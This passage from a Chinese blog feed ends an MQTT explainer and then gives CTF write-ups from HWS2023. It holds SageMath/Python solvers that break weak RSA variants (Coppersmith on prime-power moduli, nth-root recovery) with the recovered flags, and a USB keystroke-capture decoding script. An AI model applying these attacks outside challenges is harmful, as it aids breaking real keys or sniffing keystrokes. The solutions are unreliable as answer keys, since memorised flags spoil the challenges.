href="https://www.emqx.com/zh/blog/introduction-to-mqtt-qos">MQTT QoS 0, 1, 2 介绍</a>。</p><h2 id="MQTT-的工作流程"><a href="#MQTT-的工作流程" class="headerlink" title="MQTT 的工作流程"></a>MQTT 的工作流程</h2><p>在了解了 MQTT 的基本组件之后，让我们来看看它的一般工作流程：</p><ol><li><strong>客户端使用 TCP/IP 协议与 Broker 建立连接</strong>，可以选择使用 TLS/SSL 加密来实现安全通信。客户端提供认证信息，并指定会话类型（Clean Session 或 Persistent Session）。</li><li><strong>客户端既可以向特定主题发布消息，也可以订阅主题以接收消息</strong>。当客户端发布消息时，它会将消息发送给 MQTT Broker；而当客户端订阅消息时，它会接收与订阅主题相关的消息。</li><li><strong>MQTT Broker 接收发布的消息</strong>，并将这些消息转发给订阅了对应主题的客户端。它根据 QoS 等级确保消息可靠传递，并根据会话类型为断开连接的客户端存储消息。</li></ol>]]></content>
    
    
    <categories>
      
      <category>IoT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023 夏令营</title>
    <link href="/2023/08/04/HWSsummer2023/"/>
    <url>/2023/08/04/HWSsummer2023/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2023hwsummer/1.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>强网杯2022Factor魔改，参考大佬的博客，写的非常细<br><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/Prime-Power-RSA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022/Crypto/Factor/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022CryptoFactor-writeup.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/Prime-Power-RSA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022/Crypto/Factor/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022CryptoFactor-writeup.html</a><br>Paper：<a href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a><br><img src="/mdimg/2023hwsummer/2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">m1=<span class="hljs-number">8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221</span><br>m2=<span class="hljs-number">22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079</span><br>n2=<span class="hljs-number">26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977</span><br>e2 = <span class="hljs-number">0x10001</span><br>c2=<span class="hljs-number">15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve2</span>(<span class="hljs-params">m1, m2</span>):<br>    m1 = <span class="hljs-built_in">int</span>(m1)<br>    m2 = <span class="hljs-built_in">int</span>(m2)<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))<br>    f = m1*m2*x-(m2-m1)<br>    r = <span class="hljs-number">7</span><br>    beta = <span class="hljs-number">1</span>/(r+<span class="hljs-number">1</span>)<br>    idx = (r*(r-<span class="hljs-number">1</span>)) / ((r+<span class="hljs-number">1</span>)*(r+<span class="hljs-number">1</span>))<br>    kbits = <span class="hljs-built_in">int</span>(<span class="hljs-number">2048</span>*idx)//<span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">from</span> sage.misc.verbose <span class="hljs-keyword">import</span> set_verbose<br>    set_verbose(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------LLL debug---------------&quot;</span>)<br>    x = f.monic().small_roots(X=<span class="hljs-number">2</span>**kbits, beta=beta)[<span class="hljs-number">0</span>]<br>    set_verbose(<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------------------------------------------&quot;</span>)<br>    equ = m1*m2*x-(m2-m1)<br>    g = gcd(equ, n2)<br>    p = <span class="hljs-built_in">int</span>(g)^(<span class="hljs-number">1</span>/(r-<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">assert</span> n2%p == <span class="hljs-number">0</span><br>    q = n2//p^r<br>    <span class="hljs-keyword">assert</span> n2%q == <span class="hljs-number">0</span><br>    phi = p^(r-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    d = inverse_mod(e2, phi)<br>    m = <span class="hljs-built_in">pow</span>(c2, d, n2)<br>    <span class="hljs-keyword">return</span> m<br><br>b = solve2(m1,m2)<br><span class="hljs-comment">#print(b)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(b)[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-comment">#flag&#123;RSA_1s_s0_ez_4nd_hwser_c4n_bre4k_1t!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>参考<a href="https://tttang.com/archive/1504/#toc_3ammadleman-manders-miller-cubic-root-extraction-method">https://tttang.com/archive/1504/#toc_3ammadleman-manders-miller-cubic-root-extraction-method</a><br>思路是先去爆破这个左移的位数，然后按照题目中生成素数的路子来。用<code>n</code>是否可以整除那个素数来判断是不是正确的素数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = []<br><span class="hljs-comment">#for i in tqdm(range(128,256)):</span><br>base = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">175</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> trange(<span class="hljs-number">0</span>,<span class="hljs-number">500000</span>):<br>    p = <span class="hljs-built_in">int</span>(next_prime(base + j))<br>    <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>        <span class="hljs-comment">#print(f&#x27;base=&#123;base&#125;\n&#x27;)</span><br>        <span class="hljs-keyword">if</span> p <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> p_list:<br>            p_list.append(p)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p=<span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br>        <br><span class="hljs-built_in">print</span>(p_list)<br><br><br><span class="hljs-comment">#base=47890485652059026823698344598447161988085597568237568</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568251161</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568297951</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568338059</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568363667</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568398337</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568433917</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568484111</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568667099</span><br><span class="hljs-string">p=47890485652059026823698344598447161988085597568729849</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>用 <code>n % (int(p)**int(j))</code> 来判断 <code>p</code> 是<code>n</code> 的几次幂，如果余数不为 <code>0</code> 那么循环的<code>j</code> 就是几次幂。将 <code>p_list[i] ** mi[i]</code> 添加到一个新列表，后面添加判断相乘是否为 <code>n</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = [<span class="hljs-number">47890485652059026823698344598447161988085597568251161</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568297951</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568338059</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568363667</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568398337</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568433917</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568484111</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568667099</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568729849</span>]<br>mi = []<br><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> n % (<span class="hljs-built_in">int</span>(p)**<span class="hljs-built_in">int</span>(j)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>的幂为：<span class="hljs-subst">&#123;j-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>            mi.append(j-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> j==<span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>的幂为：<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br>            mi.append(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(mi)<br><br>check = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mi)):<br>    check *= p_list[i] ** mi[i]<br><span class="hljs-built_in">print</span>(check - n)<br></code></pre></td></tr></table></figure><p>最后一部分把 <code>e</code>的公因数 <code>108</code>去除之后，参考文章内容用 <code>sage</code> 的 <code>nth_root</code> 直接开根即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>c = <span class="hljs-number">29259244746260903447574448389058952310000390135231599667104954615635954705912759181552349897154663199516384757779582324312559110410628822220097857204989378367616522573650610718867075518776621505865327181301059226036067398269476892575801933638458560523584293063843890012581096233699743704556897984235725492806550009731913445801481786988321848320254380607620726887530437151238556482879159888862341096974129499878601309077513908335631417136332585391767849651968095851808312565329858938394084369711172343300695636449663297542069122814607488273607842533010193498547579501368165500427762712900139188279259336486273788664239339542187191374015805659616093967428577968683677885747775540903578723024681500272919689849253480672194507905399890280339044782040395397922973935735424691828624724029439840506402735626398047317544972966643810550593849196291833043243448655939654884418027006572740130515844853007135331296523599052132266288322473865775521953742444721612389547052020839760259179074124960827686670217980159612966767064088131176654212504654177367329044762238432531402899949096987765334061101859346928585114984440559379578507872401025874782849854603895110182401204202962118890563473961321104811452539667609870771280348801335004559132482743318366689808669972965573335905879806817618597010442262336079838039317609336210571773187461470707420797827741277982208089496339300646565067740673242728353659143107970717482392927903021102141779217003523105389389513154792904745687959335115429159530013641777064904216646895961910784920181748841104318013067029395394948190384737300533803009402182800702</span><br>n = <span class="hljs-number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span><br>p_list = [<span class="hljs-number">47890485652059026823698344598447161988085597568251161</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568297951</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568338059</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568363667</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568398337</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568433917</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568484111</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568667099</span>, <span class="hljs-number">47890485652059026823698344598447161988085597568729849</span>]<br>mi = []<br><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> n % (<span class="hljs-built_in">int</span>(p)**<span class="hljs-built_in">int</span>(j)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>的幂为：<span class="hljs-subst">&#123;j-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>            mi.append(j-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> j==<span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p<span class="hljs-subst">&#123;p_list.index(p)&#125;</span>的幂为：<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br>            mi.append(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(mi)<br><br>n_list = [p_list[i] ** mi[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mi))]<br><span class="hljs-comment">#print(n_list)</span><br><span class="hljs-built_in">print</span>(reduce((<span class="hljs-keyword">lambda</span> x, y: x * y), n_list) - n)<br><br>e = <span class="hljs-number">57564</span><br><br>res=[]<br><br><span class="hljs-keyword">for</span> pi <span class="hljs-keyword">in</span> n_list:<br>    d = inverse(<span class="hljs-built_in">int</span>(e//<span class="hljs-number">108</span>),euler_phi(pi))<br>    m = <span class="hljs-built_in">pow</span>(c,d,pi)<br>    res.append(Zmod(pi)(m).nth_root(<span class="hljs-number">108</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">True</span>))<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">for</span> vc <span class="hljs-keyword">in</span> itertools.product(*res):<br>    _c = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> vc]<br>    m = long_to_bytes(<span class="hljs-built_in">int</span>(crt(_c, n_list)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> m:<br>        <span class="hljs-built_in">print</span>(m)<br><br><span class="hljs-comment">#flag&#123;U_ar3_The_K1ng_oF_rand0m_kin9Dom!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>前面是常规键盘流量分析，后面有点野路子。<br><code>tshark -r misc1.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># 鼠标流量的话 len 改为 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br></code></pre></td></tr></table></figure><p>发现导出的数据第一列有异常，部分为<code>20</code>，常见的键盘流量分析题目，均为<code>00</code> <code>01</code> <code>02</code>等类型，遂手动将第一列的<code>20</code>改为<code>02</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span 